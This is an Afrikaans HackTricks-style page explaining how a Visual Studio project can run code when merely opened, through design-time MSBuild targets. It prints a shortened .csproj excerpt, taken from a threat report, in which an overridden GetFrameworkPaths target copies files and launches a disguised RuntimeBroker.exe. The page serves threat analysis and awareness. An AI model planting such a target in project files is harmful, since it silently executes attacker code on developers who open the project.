# Visual Studio-projek se ontwerp-tydse MSBuild-uitvoering

{{#include ../banners/hacktricks-training.md}}

Om ’n C#-projek in Visual Studio oop te maak, is nie ’n passiewe leesaksie nie. Die ontwerp-tyd-bou roep benoemde MSBuild-teikens aan om IntelliSense, verwysings en ontfouting te inisialiseer **voordat** die ontwikkelaar Build of Run kies. `GetFrameworkPaths` is een van hierdie teikens. ’n Projek wat dit herdefinieer, kan veroorsaak dat die projek gelaai word en kode in die gebruiker se konteks uitgevoer word, sonder dat ’n aparte payload-klik nodig is.<sup>[[1]](#references)[[2]](#references)</sup>

Die gerapporteerde projek het hulpbronlêers verklaar en daarna `MakeDir`, `Copy` en `Exec` binne sy vervangingsteiken gebruik om ’n payload in dieselfde gids voor te berei en te begin. Hierdie verkorte uittreksel behou die uitvoeringspad wat in Figuur 6 van die bron getoon word; dit hoort binne ’n `.csproj`, nie in ’n selfstandige XML-lêer nie.<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**Die invoervolgorde maak saak:** MSBuild gebruik die *laaste* definisie van ’n target. Daar is geen waarborg dat ’n target wat in ’n projeklêer geskryf is, die Microsoft-target vervang as ’n latere invoer dit herdefinieer nie. Projekte in SDK-styl wat `<Project Sdk="...">` gebruik, voer SDK-targets implisiet ná die projekinhoud in. Ondersoek dus die geëvalueerde invoervolgorde eerder as om aan te neem dat hierdie presiese oorheersing in elke projek werk. `MSBuild.exe -preprocess:expanded.xml project.csproj` brei invoere uit sonder om die projek te bou en kan help om die effektiewe target-definisie op te spoor.<sup>[[3]](#references)[[4]](#references)</sup>

Dit is ’n uitvoeringsoppervlak vir ontwikkelaarprojekte, nie ’n VSIX-uitbreidingsinstallasie nie, en op sigself ook nie ’n voorregteverhoging nie. As die opgevoerbare uitvoerbare lêer ’n kwaadwillige aangrensende `.exe.config`-lêer of DLL gebruik, gaan voort met [AppDomainManager-kaping en DLL-sideloading](windows-local-privilege-escalation/dll-hijacking/).

## References

- [1] [Unit 42 - Blinder Tunnel-veldtog teiken Irakse infrastruktuur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio-integrasie (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild-targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild-opdraglynverwysing](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
